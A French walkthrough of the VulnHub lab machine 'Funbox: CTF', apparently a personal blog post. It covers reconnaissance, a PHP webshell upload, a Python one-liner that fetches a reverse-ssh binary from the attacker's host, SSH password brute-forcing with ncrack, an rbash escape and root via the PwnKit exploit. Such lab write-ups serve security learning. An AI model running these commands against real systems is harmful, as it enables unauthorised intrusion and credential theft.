### NOWAY

[Funbox: CTF](https://www.vulnhub.com/entry/funbox-ctf,546/) est le quatrième de la série.

La description du CTF donne cet indice `Hints: Nikto scans "case sensitive"`. On verra bien.

```console
$ sudo nmap -sCV --script vuln -T5 -p- 192.168.56.123
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.123
Host is up (0.00023s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:173661      9.8     https://vulners.com/packetstorm/PACKETSTORM:173661      *EXPLOIT*
--- snip ---
|       1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
|       1337DAY-ID-26468        0.0     https://vulners.com/zdt/1337DAY-ID-26468        *EXPLOIT*
|_      1337DAY-ID-25391        0.0     https://vulners.com/zdt/1337DAY-ID-25391        *EXPLOIT*
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
|       PACKETSTORM:176334      9.8     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
|       PACKETSTORM:171631      9.8     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-       9.8     https://vulners.com/metasploit/MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-        *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-       9.8     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH-        *EXPLOIT*
--- snip ---
|       PACKETSTORM:164501      0.0     https://vulners.com/packetstorm/PACKETSTORM:164501      *EXPLOIT*
|       PACKETSTORM:164418      0.0     https://vulners.com/packetstorm/PACKETSTORM:164418      *EXPLOIT*
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|       PACKETSTORM:140265      0.0     https://vulners.com/packetstorm/PACKETSTORM:140265      *EXPLOIT*
|       1337DAY-ID-26497        0.0     https://vulners.com/zdt/1337DAY-ID-26497        *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
110/tcp open  pop3    Dovecot pop3d
143/tcp open  imap    Dovecot imapd
MAC Address: 08:00:27:B8:22:A6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 330.10 seconds
```

Il est vrai qu'on est vite bloqués. Les wordlist habituelles ne trouvent rien sur le serveur web.

Du coup, j'ai lancé un `Nikto`... Nada!

```console
$ docker run --rm sullo/nikto -C all -host 192.168.56.123
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.123
+ Target Hostname:    192.168.56.123
+ Target Port:        80
+ Start Time:         2025-07-02 12:32:15 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 5ae05b2177aa4, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+ /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
+ /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
+ /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
+ Apache/2.4.18 appears to be outdated (current is at least 2.4.63). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 26627 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2025-07-02 12:33:00 (GMT0) (45 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Finalement en fouillant avec des wordlists moins habituelles, je trouve un `robots.txt` mal orthographié (mauvaise casse).

```console
$ feroxbuster -u http://192.168.56.123 -w wordlists/files/Filenames_or_Directories_All.wordlist

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.123
 🚀  Threads               │ 50
 📖  Wordlist              │ wordlists/files/Filenames_or_Directories_All.wordlist
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
403       11l       32w      298c http://192.168.56.123/.htpasswd
403       11l       32w      298c http://192.168.56.123/.htaccess
403       11l       32w      299c http://192.168.56.123/.htpasswds
200      220l        4w      273c http://192.168.56.123/ROBOTS.TXT
[####################] - 6s     45522/45522   0s      found:4       errors:2      
[####################] - 5s     45522/45522   8090/s  http://192.168.56.123
```

On est d'accord : en vrai, ça n'a aucun sens.

Le fichier contient plein de lignes vides avant la seconde entrée, je filtre :

```console
$ curl -s http://192.168.56.123/ROBOTS.TXT | grep -v "^$"
Disallow: upload/
Disallow: igmseklhgmrjmtherij2145236
```

Dans le dossier trouvé se cache un dossier `upload` et un script `upload.php` :

```console
$ curl -s http://192.168.56.123/igmseklhgmrjmtherij2145236/upload.php
<!DOCTYPE html>
<html>
<head>
  <title>Upload</title>
</head>
<body>
  <form enctype="multipart/form-data" action="upload.php" method="POST">
    <p>Upload your time sheet, please:</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
```

L'upload se passe sans problèmes :

```console
$ curl -D- "http://192.168.56.123/igmseklhgmrjmtherij2145236/upload.php" -X POST -F 'uploaded_file=@shell.php'
HTTP/1.1 200 OK
Date: Wed, 02 Jul 2025 12:50:44 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 355
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
  <title>Upload</title>
</head>
<body>
  <form enctype="multipart/form-data" action="upload.php" method="POST">
    <p>Upload your time sheet, please:</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
The file shell.php has been uploaded
$ curl -s "http://192.168.56.123/igmseklhgmrjmtherij2145236/upload/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Webshell obtenu. Mais au moment d'aller plus loin, on découvre que `curl`, `wget`, `netcat` sont absents...

On va se servir de Python :

```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://192.168.56.1/reverse-sshx64', 'reverse-sshx64')"
```

### Password!

À la racine du système de fichier se trouve un fichier avec des indices... ou pas.

```console
www-data@funbox4:/$ cat hint.txt 
The OS beard ist whiter and longer as Gandalfs one !
Perhaps, its possible to get root from here. 
I doesnt look forward to see this in the writeups/walktroughs, 
but this is murpys law !

Now, rockyou.txt isnt your friend. Its a little sed harder :-)

If you need more brainfuck: Take this:
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++++++++++.>++++.---.<<++.>>+++++++++.---------.+++++++++++++++++++.----.<<.>>------------.+.+++++.++++++.<<.>>-----------.++++++++++.<<.>>-------.+++.------------.--.+++++++++++++++++++.---------------.-.<<.>>+++++.+++++.<<++++++++++++++++++++++++++.

Bit more ?
Tm8gaGludHMgaGVyZSAhCg==

Not enough ?
KNSWC4TDNAQGM33SEB2G6ZDPOMXA====

www-data@funbox4:/$ echo Tm8gaGludHMgaGVyZSAhCg== | base64 -d                                                                                  
No hints here !
www-data@funbox4:/$ echo KNSWC4TDNAQGM33SEB2G6ZDPOMXA==== | base64 -d
(Ԗ
  ��43}�����8��base64: invalid input
```

Le code Brainfuck donne :

```
The next hint is located in:
```

On va plutôt suivre un cheminement classique en regardant du côté des utilisateurs :

```console
www-data@funbox4:/$ ls /home/
total 16
drwxr-xr-x  4 root   root   4096 Aug 29  2020 .
drwxr-xr-x 23 root   root   4096 Jul  2 14:29 ..
drwx------  4 anna   anna   4096 Aug 30  2020 anna
drwxr-xr-x  4 thomas thomas 4096 Aug 30  2020 thomas
www-data@funbox4:/$ id anna
uid=1000(anna) gid=1000(anna) groups=1000(anna),4(adm),8(mail),27(sudo),30(dip),46(plugdev),121(lpadmin)
www-data@funbox4:/$ id thomas
uid=1001(thomas) gid=1001(thomas) groups=1001(thomas),8(mail)
```

Vu que `anna` fait partie du groupe `sudo`, ça semblait plus logique côté scénario de terminer par ce compte. Je m'oriente vers `thomas` :

```console
www-data@funbox4:/$ find / -user thomas -ls 2> /dev/null 
    42106      4 drwxr-xr-x   4 thomas   thomas       4096 Aug 30  2020 /home/thomas
    42107      4 -rw-r--r--   1 thomas   thomas        220 Aug 29  2020 /home/thomas/.bash_logout
   131233      4 drwx------   2 thomas   thomas       4096 Aug 30  2020 /home/thomas/.ssh
    24752   3008 -rwx------   1 thomas   thomas    3078592 Aug 22  2019 /home/thomas/pspy64
      689      4 -rw-------   1 thomas   thomas       1304 Aug 30  2020 /home/thomas/.viminfo
    42108      4 -rw-r--r--   1 thomas   thomas       3771 Aug 29  2020 /home/thomas/.bashrc
    46377      4 drwx------   2 thomas   thomas       4096 Aug 29  2020 /home/thomas/.cache
      666      4 -rw-------   1 thomas   thomas         46 Aug 30  2020 /home/thomas/.bash_history
    42109      4 -rw-r--r--   1 thomas   thomas        675 Aug 29  2020 /home/thomas/.profile
    46103      4 -rw-r--r--   1 thomas   thomas        195 Aug 29  2020 /home/thomas/.todo
     6349      4 -rw-rw-r--   1 thomas   thomas        217 Aug 30  2020 /home/thomas/.wget-hsts
www-data@funbox4:/$ cat /home/thomas/.todo
1. make coffee
2. check backup
3. buy ram
4. call simone
5. check my mails
6. call lucas
7. add an exclamation mark to my passwords
.
.
.
.
.
.
100. learn to read emails without a gui-client !!!
```

On va suivre cette histoire de point d'exclamation, ne garder que les mots de passe de rockyou avec le caractère :

```console
$ ncrack -f -u thomas -P /tmp/with_exclamation.txt ssh://192.168.56.123

Starting Ncrack 0.8 ( http://ncrack.org )

Discovered credentials for ssh on 192.168.56.123 22/tcp:
192.168.56.123 22/tcp ssh: 'thomas' 'thebest!'

Ncrack done: 1 service scanned in 192.05 seconds.

Ncrack finished.
```

### ./PwnKit

On retrouve le `rbash` présent sur tous les précédents opus.

```console
www-data@funbox4:/tmp$ su thomas
Password: 
thomas@funbox4:/tmp$ cd
rbash: cd: restricted
thomas@funbox4:/tmp$ python3 -c 'import pty;pty.spawn("/bin/bash")'
thomas@funbox4:/tmp$ cd
thomas@funbox4:~$ ls
pspy64
thomas@funbox4:~$ ls -al
total 3052
drwxr-xr-x 4 thomas thomas    4096 Aug 30  2020 .
drwxr-xr-x 4 root   root      4096 Aug 29  2020 ..
-rw------- 1 thomas thomas      46 Aug 30  2020 .bash_history
-rw-r--r-- 1 thomas thomas     220 Aug 29  2020 .bash_logout
-rw-r--r-- 1 thomas thomas    3771 Aug 29  2020 .bashrc
drwx------ 2 thomas thomas    4096 Aug 29  2020 .cache
-rw-r--r-- 1 thomas thomas     675 Aug 29  2020 .profile
-rwx------ 1 thomas thomas 3078592 Aug 22  2019 pspy64
drwx------ 2 thomas thomas    4096 Aug 30  2020 .ssh
-rw-r--r-- 1 thomas thomas     195 Aug 29  2020 .todo
-rw------- 1 thomas thomas    1304 Aug 30  2020 .viminfo
-rw-rw-r-- 1 thomas thomas     217 Aug 30  2020 .wget-hsts
thomas@funbox4:~$ sudo -l
[sudo] password for thomas: 
Sorry, user thomas may not run sudo on funbox4.
thomas@funbox4:~$ mail
No mail for thomas
thomas@funbox4:~$ ls .ssh/
known_hosts
```

J'avais l'espoir de lire des emails... mais non.

```console
thomas@funbox4:~$ telnet 127.0.0.1 110
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
+OK Dovecot ready.
USER thomas
+OK
PASS thebest!
+OK Logged in.
list
+OK 0 messages:
.
quit
+OK Logging out.
Connection closed by foreign host.
```

J'ai ensuite tourné longuement autour du compte `anna` et du groupe `mail` sans succès.

`LinPEAS` m'a détecté la présence de la faille `pkexec`, j'ai donc utilisé cet exploit qui est fiable :

[GitHub - ly4k/PwnKit: Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation](https://github.com/ly4k/PwnKit)

```console
thomas@funbox4:/tmp/PwnKit$ ./PwnKit
root@funbox4:/tmp/PwnKit# id
uid=0(root) gid=0(root) groups=0(root),8(mail),1001(thomas)
root@funbox4:/tmp/PwnKit# cd /root
root@funbox4:~# ls
flag.txt
root@funbox4:~# cat flag.txt
(  _`\              ( )                       (  _`\(_   _)(  _`\ 
| (_(_)_   _   ___  | |_      _          _    | ( (_) | |  | (_(_)
|  _) ( ) ( )/' _ `\| '_`\  /'_`\ (`\/')(_)   | |  _  | |  |  _)  
| |   | (_) || ( ) || |_) )( (_) ) >  <  _    | (_( ) | |  | |    
(_)   `\___/'(_) (_)(_,__/'`\___/'(_/\_)(_)   (____/' (_)  (_)    

Well done ! Made with ❤ by @0815R2d2 ! I look forward to see this screenshot on twitter ;-)
```
